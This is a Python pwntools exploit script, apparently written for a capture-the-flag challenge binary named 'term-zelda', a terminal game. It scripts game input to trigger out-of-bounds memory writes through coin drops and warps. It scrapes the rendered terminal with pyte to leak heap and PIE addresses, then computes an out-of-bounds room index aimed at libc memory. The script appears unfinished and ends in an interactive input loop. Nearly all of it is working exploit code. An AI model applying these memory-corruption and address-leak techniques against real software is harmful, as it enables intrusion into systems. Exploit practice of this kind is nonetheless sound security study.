from pwn import *
from threading import Thread
import pyte
import time
import math

dims = (80, 14)

screen = pyte.Screen(*dims)
stream = pyte.ByteStream(screen)
stream.select_other_charset("@")

context.aslr= False

# Establish the target process
binary = ELF("./term-zelda")
p = gdb.debug(
    binary.path,
    env={
        "TERM": "linux",
        "COLUMNS": str(dims[0]),
        "LINES": str(dims[1]),
    },
)


def feed_stream():
    while True:
        stream.feed(p.recv(2048))
        for i in screen.display:
            print(repr(i))
        print()


Thread(target=feed_stream).start()

# arrow key characters
up = "u"
down = "d"
left = "l"
right = "r"
put = "p"
get = "g"
reset = "X"
lookup = {
    "u": b"\x1b[A",
    "d": b"\x1b[B",
    "l": b"\x1b[D",
    "r": b"\x1b[C",
    
    "p": b"p",
    "g": b"g",
    "q": b"q",
    "X": b"r",
    
    "A": b"A",
    
    
    "M": b"\x1b[M",
    
}


def reassemble_byte(c):
    if c.fg == "default":
        return p8(0)
    byte = 0
    wall_tiles = ["─", "│", "┌", "┐", "└", "┘", "?", "?"]
    colors = ["black", "red", "green", "brown", "blue", "magenta", "cyan", "white"]
    match c.data:
        case " ":
            byte |= 0b00
        case "─" | "│" | "┌" | "┐" | "└" | "┘" | "?":
            byte |= 0b11
            byte |= wall_tiles.index(c.data) << 5
        case "◆":
            byte |= 0b10
        case "°":
            byte |= 0b01

    # dunno why this happens, but color_pair(0) is just special?
    if not (c.bg == "black" and c.fg == "white"):
        byte |= colors.index(c.fg) << 2
        byte |= colors.index(c.bg) << 5
    return p8(byte)


def parse():
    def render(line):
        found = False
        for x in range(screen.columns):
            if line[x].data == "│":
                found = True
            if found:
                yield reassemble_byte(line[x])

    for y in range(3, screen.lines - 3):
        yield b"".join(render(screen.buffer[y]))


# chunk input into 10 byte frames for send_input_frame
def send_input_frames(input):
    for i in range(0, len(input), 40):
        p.sendline(b"".join([lookup[i] for i in input[i : i + 40]]))
        time.sleep(0.01)


# ensure player is on 19f to line up for retrieval
def visit_acs_map(byte):
    def return_to_start():
        send_input_frames((byte // 4) * up)
        send_input_frames(4 * (byte % 4) * left)

    send_input_frames((4 * (byte % 4)) * right)
    send_input_frames((byte // 4) * down)

    return return_to_start

def lineup_for_acs():
    send_input_frames(right * 10 + down * 6)
    

# go through first gate
send_input_frames(left * 6)

# go through second gate, looking up
send_input_frames(left * 6 + up)

# pass through gate again
send_input_frames(left * 6)


# # we're in the wall now. clear the wall with a coin drop
send_input_frames(put + down)

# now, we need to load room 6 to leak heap & pie. we can't warp to room 6 since its direction will segfault us.
# we also can't change the direction since it's a wall. so, we need to warp into the room 6 "direction wall" to reset it.
# we can do this through a save warp to room 1, with an oob position which lands on the direction wall.

# to find the position which lands on the direction wall, we need find coin droppable x and y coordinates
# which equal 0x2a4 + saved_direction. in z3, we can express this as:
# solve(x & 0b11 == 1, y & 0b11 == 1, ZeroExt(64, x) + 16*ZeroExt(64, y) == 0x2a4 ± 1 ± 16)
# this has a few solutions, but let's use EAST: [y = 41, x = 21] for minimum work


# line up for acs_map retrieval
lineup_for_acs()

# # # first, we need to set last dir to be east by entering room 1 gate from the west
# # # the byte 06 is in acs_map
visit_acs_map(6)
send_input_frames(right * 2 + left)  # warp
send_input_frames(left * 6 + down * 2)  # exit spawn


# line up for acs_map retrieval
lineup_for_acs()
ret = visit_acs_map(41)
# pickup 10 coins (tile = 41)
send_input_frames(right + get + left)
ret()

# go to player & set previous room's pos.y
send_input_frames(up * 3 + right * 10 + up + put)
send_input_frames(down + left * 10 + down * 3)

# pickup 5 coins (tile = 21)
ret = visit_acs_map(25)
send_input_frames(right + get + left)
ret()

# player mod
send_input_frames(up * 3 + right * 9 + up + put)
send_input_frames(down + left * 9 + down * 3)


ret = visit_acs_map(0x6) # goto room 1 gate
send_input_frames(right) # tp into room 6 wall, reset direction
send_input_frames(put + get + left * 2 + put + get + right * 4) # clear direction

send_input_frames(up * 30 + right) # return to acs_map staging point
ret = visit_acs_map(0x1a) # goto room 1 gate
send_input_frames(right) # tp to room 6


time.sleep(1)  # wait for renders

# obtain leaks
leaked_mem = [*parse()]
print(leaked_mem)
heap = u64(leaked_mem[2][2:10]) - 0x60f0
binary.address = u64(leaked_mem[3][2:10]) - 0x53a3

libc_cluster = heap + 0x2c0

p.success("heap leak: " + hex(heap))
p.success("pie leak: " + hex(binary.address))

idx = math.ceil((libc_cluster - binary.symbols["player"] + 0x14) / 0x88)
# idx = 0x13d7d
p.success("idx: " + hex(idx))

for i in p32(idx):
    if i != 0 and (i % 4 != 1 or i > 0x7f):
        p.error(f"idx (byte {hex(i)}) is not coin droppable")
        exit()
# 0x27c0c, 0x1bc66, 0x332a2, 0xe157, 0x13ee, 0x13c84, 0x17e0c

# we've now got to change room_idx to the new idx in just one frame.
# to make the window, we'll need to collect all the coins we'll need to drop next to room_idx
# from there, we can do something like:
# drop first byte, move up, pickup second byte, move down, move left, drop second byte, move up, pickup third byte, move down, move left, drop third byte


send_input_frames(reset)
send_input_frames(left * 6)
send_input_frames(left * 6 + down * 2)
lineup_for_acs()

# cache all coin values
for i, byte in enumerate(p32(idx)[:3]):
    ret = visit_acs_map(byte) # goto room 1 gate
    send_input_frames(right + get + left) # pickup byte
    ret()

    send_input_frames(up * 3 + right * (9 +i) + put) # set byte
    send_input_frames(left * (9 + i) + down * 3)

send_input_frames(up * 3 + right * 9 + get) # return to cache

# do copy
drop = left * 4 + put
# one byte case
send_input_frames(drop)
# send_input_frames(left * 4 + put + right * 5 + get + left * 4 + put + right * 5 + get + left * 4 + put)



# for i, byte in enumerate(p32(idx)[:3]):
#     if byte == 0:
#         continue
#     drop += 

# 368 = start of fifo
# 590 = fifo attributes
# 5cc = echo

while True:
    # read word from stdin representing direction, and send int
    s = input("Enter direction: ").strip()
    p.sendline(b"".join([lookup[i] for i in s]))
    # print(parse_screen())

    # send up char
